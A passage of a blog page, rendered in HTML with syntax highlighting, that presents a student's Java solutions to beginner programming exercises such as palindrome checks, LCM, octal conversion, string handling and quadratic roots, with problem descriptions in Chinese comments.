class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h02;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Home02</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Home02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 一个整数，判断整数是不是回文数。例如：12321是回文数，个位与万位相同，十位与千位相同</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetricalNum</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">12</span>];</span><br><span class="line">		<span class="keyword">int</span> index = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			a[++index] = i % <span class="number">10</span>;</span><br><span class="line">			i /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> front=<span class="number">0</span>,back=index;front&lt;back;front++,back--) &#123;</span><br><span class="line">			<span class="keyword">if</span>(a[front]!=a[back]) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 计算i的阶乘</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(i == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> i*factorial(i-<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 计算裴波那契数列的第n项</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">calcPeponacci</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(i == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> calcPeponacci(i-<span class="number">1</span>)+calcPeponacci(i-<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 将一个正整数各位颠倒后返回 </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseInt</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			result = result*<span class="number">10</span> + i%<span class="number">10</span>;</span><br><span class="line">			i /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 计算一个整数各位数之和 </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">mySum</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			sum += i%<span class="number">10</span>;</span><br><span class="line">			i /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 计算两个整数的最小公倍数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LCM</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 首先保存下两个数的因数</span></span><br><span class="line">		<span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">30</span>];</span><br><span class="line">		<span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">30</span>];</span><br><span class="line">		<span class="keyword">int</span> indexOfA = -<span class="number">1</span>,indexOfB = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> tmp = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">while</span>(i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(i%tmp == <span class="number">0</span>) &#123;</span><br><span class="line">				a[++indexOfA] = tmp;</span><br><span class="line">				i /= tmp;</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				++tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		tmp = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">while</span>(j &gt; <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(j%tmp == <span class="number">0</span>) &#123;</span><br><span class="line">				b[++indexOfB] = tmp;</span><br><span class="line">				j /= tmp;</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				++tmp;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 现在两个数的因子都被保存在了a 和 b 两个数组中</span></span><br><span class="line">		<span class="comment">// 再用他们组合出最小公倍数</span></span><br><span class="line">		<span class="keyword">int</span> left = <span class="number">0</span>,right = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(;left &lt;= indexOfA &amp;&amp; right &lt;= indexOfB;) &#123;</span><br><span class="line">			<span class="keyword">if</span>(a[left] == b[right]) &#123;</span><br><span class="line">				result *= a[left];</span><br><span class="line">				left++;right++;</span><br><span class="line">			&#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[left] &lt; b[right]) &#123;</span><br><span class="line">				result *= a[left++];</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				result *= b[right++];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(;left &lt;= indexOfA;left++) &#123;</span><br><span class="line">			result *= a[left];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(;right &lt;= indexOfB ;right++) &#123;</span><br><span class="line">			result *= b[right];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 计算两点之间的距离</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getDistance</span><span class="params">(<span class="keyword">double</span> x1,<span class="keyword">double</span> y1,<span class="keyword">double</span> x2,<span class="keyword">double</span> y2)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Math.sqrt(Math.pow(x1-x2,<span class="number">2</span>) + Math.pow(y1-y2, <span class="number">2</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回一个数组中最大元素的位置（元素不会出现相等的情形）</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMaxIndex</span><span class="params">(<span class="keyword">int</span>[] a )</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;<span class="keyword">int</span> tmpMax = -<span class="number">999999</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i &lt; a.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(tmpMax &lt; a[i]) &#123;</span><br><span class="line">				index = i;</span><br><span class="line">				tmpMax = a[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> index;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 判断一个字符串中一个字符出现的次数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCharCount</span><span class="params">(String str ,<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> length = str.length();</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(str.charAt(i)==c) &#123;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 判断一个字符串中一个字符串出现的次数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getStrCount</span><span class="params">(String str ,String sub)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> len1 = str.length();</span><br><span class="line">		<span class="keyword">int</span> len2 = sub.length();</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i &lt; len1-len2;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(str.substring(i,i+len2).equals(sub)) &#123;</span><br><span class="line">				count ++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home03"><a href="#Home03" class="headerlink" title="Home03"></a>Home03</h3><ul>
<li>Home03.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Home03</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Home03</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 返回一个正整数数组a中偶数的个数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getEvenCount</span><span class="params">(<span class="keyword">int</span>[] a)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;a.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(a[i]%<span class="number">2</span>==<span class="number">0</span>)count++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 将个10进制非负整数变成8进制的数</span></span><br><span class="line"><span class="comment">	 * 例如输入 binToOct(8) 返回 "10"</span></span><br><span class="line"><span class="comment">	 * 输入 binToOct(10) 返回 "12"</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">binToOct</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 完成本函数里面的代码</span></span><br><span class="line">		</span><br><span class="line">		String oct = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">while</span>(i!=<span class="number">0</span>) &#123;</span><br><span class="line">			oct = (<span class="keyword">char</span>)(i%<span class="number">8</span> + <span class="string">'0'</span>)+oct;</span><br><span class="line">			i /= <span class="number">8</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println();</span><br><span class="line">		<span class="keyword">return</span> oct==<span class="string">""</span>?<span class="string">"0"</span>:oct;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 比较两个字符串，返回其中最小的字符串，提示按String.compareTo 比较即可</span></span><br><span class="line"><span class="comment">	 * 例如 getMin("abc","abe")返回"abc"</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMinStr</span><span class="params">(String s1,String s2)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 完成本函数里面的代码</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> (s1.compareTo(s2) &lt; <span class="number">0</span>) ? s1 : s2 ;	</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 判断一个字符串中是否包含大写字母，包含返回true，否则false</span></span><br><span class="line"><span class="comment">	 * 例如：containsUpperCase("Abc")返回true</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsUpperCase</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 完成本函数里面的代码</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(Character.isUpperCase(str.charAt(i)))</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 转换一个字符串中的大小写，原来是大写字母的地方转换为小写，小写字母地方转为大写</span></span><br><span class="line"><span class="comment">	 * 例如：switchUpperLower("Abc")返回 "aBC"</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">switchUpperLower</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 完成本函数里面的代码</span></span><br><span class="line">		<span class="keyword">char</span>[] ch = str.toCharArray();</span><br><span class="line">		String s0 = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(Character.isUpperCase(ch[i])) s0 += Character.toLowerCase(ch[i]);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(Character.isLowerCase(ch[i])) s0 += Character.toUpperCase(ch[i]);</span><br><span class="line">			<span class="keyword">else</span> s0 += ch[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> s0;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 去掉一个字符串中所有的空格</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * 例如：zipSpace(" a b  c ")返回 "abc"</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">zipSpace</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 完成本函数里面的代码</span></span><br><span class="line">		str = str.replace(<span class="string">" "</span>,<span class="string">""</span>);</span><br><span class="line">		<span class="keyword">return</span> str;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 将一个正整数转换为10位字符串，不足位数左补0；</span></span><br><span class="line"><span class="comment">	 * 例如：exandIntToStr10(123) 返回 "00000000123"</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> i</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">exandIntToStr10</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		String str = Integer.toString(i);</span><br><span class="line">		<span class="keyword">int</span> len = <span class="number">10</span>-str.length();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">			str = <span class="string">'0'</span>+ str;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 将一个正整数转换为len位字符串，不足位数左补0；</span></span><br><span class="line"><span class="comment">	 * 如果这个正整数本身位数超过len，则直接将这个正整数返回即可</span></span><br><span class="line"><span class="comment">	 * 例如：exandIntToStrL(123,4) 返回 "0123"</span></span><br><span class="line"><span class="comment">	 * exandIntToStrL(123,2) 返回 "123"</span></span><br><span class="line"><span class="comment">	 * 难度系数2星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> i</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> len</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">exandIntToStrL</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">		String str = Integer.toString(i);</span><br><span class="line">		<span class="keyword">if</span>(str.length() &gt; len)<span class="keyword">return</span> str;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> len0 = len - str.length();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len0; j++) &#123;</span><br><span class="line">			str = <span class="string">'0'</span>+str;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> str;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设二元一次方程 a*x*x+bx+c=0;</span></span><br><span class="line"><span class="comment">	 * 的系数分别为a,b,c</span></span><br><span class="line"><span class="comment">	 * 请将这个方程的两个实数根放在数组中返回,如果没有实数解则返回null</span></span><br><span class="line"><span class="comment">	 * 例如 getRoot(1,-2,1)返回 &#123;1,1&#125;</span></span><br><span class="line"><span class="comment">	 * 例如 getRoot(1,-2,2)返回 null</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">double</span>[] getRoot(<span class="keyword">double</span> a,<span class="keyword">double</span> b,<span class="keyword">double</span> c) &#123;</span><br><span class="line">		<span class="keyword">double</span>[] ans = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">2</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">double</span> delta = b*b -<span class="number">4</span>*a*c;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span>(delta &lt; -<span class="number">0.00001</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(Math.abs(delta) &lt; <span class="number">0.00001</span> ) &#123;</span><br><span class="line">			ans[<span class="number">0</span>] = (-b)/(<span class="number">2</span>*a);</span><br><span class="line">			ans[<span class="number">1</span>] = (-b)/(<span class="number">2</span>*a);</span><br><span class="line">			<span class="keyword">return</span> ans;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			ans[<span class="number">0</span>] = (-b + Math.sqrt(delta))/(<span class="number">2</span>*a);</span><br><span class="line">			ans[<span class="number">1</span>] = (-b - Math.sqrt(delta))/(<span class="number">2</span>*a);</span><br><span class="line">			<span class="keyword">return</span> ans;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回杨辉三角( Pascal  triangle,请百度 杨辉三角 或者 Pascal  triangle )第i行的系数，杨辉三角第一行定义为1</span></span><br><span class="line"><span class="comment">	 * 提示：从顶部的单个1开始，下面一行中的每个数字都是上面两个数字的和</span></span><br><span class="line"><span class="comment">	 * 例如getPascalTriangle(1)返回&#123;1&#125;，</span></span><br><span class="line"><span class="comment">	 * getPascalTriangle(2)返回&#123;1,2,1&#125;</span></span><br><span class="line"><span class="comment">	 * 测试的时候，系数肯定不会超过int的范围 </span></span><br><span class="line"><span class="comment">	 * 难度系数3星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> line</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getFac</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">double</span> result = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(i &gt; j) &#123;</span><br><span class="line">			result *= i--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span>[] getPascalTriangle(<span class="keyword">int</span> i) &#123;</span><br><span class="line">		<span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[i];</span><br><span class="line">		<span class="comment">// arr[j] = C(j,i-1) </span></span><br><span 